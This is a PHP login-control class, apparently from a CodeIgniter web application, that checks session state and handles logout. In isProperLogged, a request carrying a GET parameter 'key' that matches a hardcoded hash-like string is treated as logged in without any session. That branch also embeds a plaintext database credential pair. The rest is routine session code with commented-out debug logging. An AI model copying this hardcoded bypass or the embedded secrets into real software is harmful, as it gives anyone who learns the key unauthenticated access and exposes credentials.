<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of loginControl
 *
 * @author dvlpserver
 */
class logincontrol {

   //put your code here

   public function __construct() {
      $this->CI = & get_instance();

      /*
        $ds_human_resource = $this->CI->session->userdata('ds_human_resource');
        $id = $this->CI->session->userdata('session_id');
        if ($ds_human_resource) {
        $data = 'Open ' . $ds_human_resource."-".$id."\n";
        file_put_contents("/tmp/devshoes.log", $data, FILE_APPEND);
       * 



        } */
   }

   function isProperLogged($gomain = TRUE) {
      //$this->load->model("human_resource");
      
       if (isset($_GET["key"])) {
           $key = $_GET["key"];
           if ($key == 'eae3ba3d23a0bb588f40ae538f66da36') {
               $msg = $this->CI->cdbhelper->check_database('op&ra@t0r', 'operator');
               if ($msg != 'OK') {
                   die ($msg);
               }
               
               return true;
           }
           
       }
       
      $this->CI->load->helper('url');
      $this->CI->load->model('human_resource', '', TRUE);

      //die (print_r($this->CI->session->userdata()));
      
      $cd_human_resource = $this->CI->session->userdata('cd_human_resource');
      $ds_human_resource = $this->CI->session->userdata('ds_human_resource');
      $sesslg            = $this->CI->session->userdata('cd_session_log');

      //die('x' . $ds_human_resource);
      
      if (!$cd_human_resource || !$sesslg) {
         //$this->load->view('login');
         if ($gomain) {
            //redirect('main', 'refresh');
            //die;               
         }
         return false;
      }

      IF ($this->CI->cdbhelper->loginIsExpired($sesslg)) {
         $this->logout(false);
         return false;
      }

      return true;
   }

   public function logout($redirect = true) {
      $session_log = $this->CI->session->userdata('cd_session_log');
      //die ('x' . $session_log);
      
      
      if ($session_log) {
         $this->CI->cdbhelper->logoutSave($session_log);
      }

      $this->CI->session->unset_userdata('cd_human_resource_full');
      $this->CI->session->unset_userdata('cd_human_resource');
      $this->CI->session->unset_userdata('cd_session_log');
      $this->CI->session->unset_userdata('fl_super_user');
      $this->CI->session->unset_userdata('password');
      

      if ($redirect) {
         redirect('login', 'refresh');
      }
   }

   public function __destruct() {

   }

}
